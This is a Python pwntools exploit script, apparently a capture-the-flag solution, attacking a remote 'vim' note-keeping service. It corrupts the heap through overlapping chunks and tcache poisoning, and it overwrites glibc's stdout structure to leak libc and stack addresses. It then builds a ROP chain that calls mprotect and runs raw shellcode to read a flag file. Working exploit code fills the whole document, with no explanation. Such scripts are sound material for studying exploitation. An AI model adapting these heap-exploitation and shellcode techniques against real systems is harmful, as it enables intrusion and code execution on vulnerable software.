from pwn import *
while(True):
	target=remote('vim.darkarmy.xyz',32768)
	libc=ELF('./vim').libc
	def add(size,data="A"):
		target.sendlineafter("Choice: ",str(1))
		target.sendlineafter("chunk: ",str(size))
		target.sendafter("note: ",data)
	def delete(index):
		target.sendlineafter("Choice: ",str(2))
		target.sendlineafter("index: ",str(index))
	add(0x40)
	add(0x40)
	delete(0)
	delete(1)
	add(0x10)
	add(0x10)
	add(0x30)
	add(0x30)
	add(0x70)
	delete(1)
	payload="A"*0x10+p64(0)+p64(0x41)+"A"*0x30+p64(0)+p64(0x41)+"A"*0x30
	payload+=p64(0)+p64(0x4e1)+"A"*0x40+p64(0)+p64(0x491)+"A"*0x480+p64(0)+p64(0x21)+"A"*0x10+p64(0)+p64(0x7fffffffffffffff)
	add(0xf10,payload)
	delete(4)
	delete(1)
	payload="A"*0x10+p64(0)+p64(0x41)+"A"*0x30+p64(0)+p64(0x41)+"A"*0x30
	payload+=p64(0)+p64(0x51)+"\x60\x97"
	add(0xf10,payload)
	delete(3)
	delete(2)
	delete(1)
	payload="A"*0x10+p64(0)+p64(0x41)+"\xc0"
	add(0xf10,payload)
	add(0x30)
	add(0x30)
	payload=p64(0xfbad1800)+p64(0)*3+"\x00"
	try:
		add(0x30,payload)
		libc_leak=u64(target.recv(16)[8:16])
	except:
		target.close()
		continue

	libc_base=libc_leak-0x3ed8b0
	print(hex(libc_base))
	if(libc_base%0x1000!=0):
		target.close()
		continue
	libc_free_hook=libc_base+libc.symbols["__free_hook"]
	libc_environ=libc_base+libc.symbols["environ"]
	libc_2_1_stdout=libc_base+libc.symbols["_IO_2_1_stdout_"]
	libc_mprotect=libc_base+libc.symbols["mprotect"]
	poprdi=libc_base+0x000000000002155f
	poprsi=libc_base+0x0000000000023e8a
	poprdx=libc_base+0x0000000000001b96
	ppr=libc_base+0x0000000000023e88
	delete(3)
	delete(1)
	payload="A"*0x10+p64(0)+p64(0x31)+"A"*0x20+p64(0)+p64(0x21)+p64(0)+p64(0x41)+"A"*0x30+p64(0)+p64(0x51)+p64(libc_2_1_stdout)
	add(0xf10,payload)
	delete(2)
	add(0x40)
	payload=p64(0xfbad1800)+p64(0)*3+p64(libc_environ)+p64(libc_environ+0x70)
	add(0x40,payload)
	stack_leak=u64(target.recv(8))
	stack_rop=stack_leak-0x150
	delete(0)
	payload="A"*0x10+p64(0)+p64(0x31)+"A"*0x20+p64(0)+p64(0x21)
	add(0xf10,payload)
	delete(1)
	delete(0)
	payload="A"*0x10+p64(0)+p64(0x31)+p64(stack_rop)
	add(0xf10,payload)
	delete(0)
	add(0x20)
	path="./flag"
	path+="\x00"*(0x10-len(path))
	shellcode="\x48\xBF"
	shellcode+=p64(stack_rop+8)
	shellcode+="\x48\x31\xC0\x48\x31\xF6\x48\x31\xD2\xB0\x02\x0F\x05\x48\x31\xff\x40\x88\xC7\x48\xBE"
	shellcode+=p64(libc_free_hook)
	shellcode+="\xB2\xFF\x48\x31\xC0\x0F\x05\x40\xB7\x01\xB0\x01\x0F\x05"
	payload=p64(ppr)+path+p64(poprdi)+p64((stack_rop>>12)<<12)+p64(poprsi)+p64(0x1000)+p64(poprdx)+p64(7)+p64(libc_mprotect)
	payload+=p64(stack_rop+0x58)+shellcode
	add(0xf20,payload)	
	target.interactive()
